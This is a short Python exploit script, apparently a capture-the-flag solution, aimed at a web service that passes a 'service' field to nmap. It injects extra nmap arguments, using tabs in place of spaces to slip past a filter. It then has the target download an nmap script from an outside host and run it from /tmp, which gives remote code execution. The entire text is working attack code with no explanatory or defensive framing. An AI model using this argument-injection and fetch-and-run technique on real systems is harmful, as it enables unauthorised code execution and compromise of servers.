import requests
TARGET_URL = "http://35.231.135.130:32398"

def run(payload):
    resp = requests.post(TARGET_URL,data={"service":"129.80.25.148:8080\t" + payload}).text
    return resp.split("<code>")[1].split("</code>")[0]

print(run("--script http-fetch --script-args destination=/tmp,url=upload.nse".replace(" ","\t")))
print(run("--script=/tmp/129.80.25.148/8080/upload.nse"))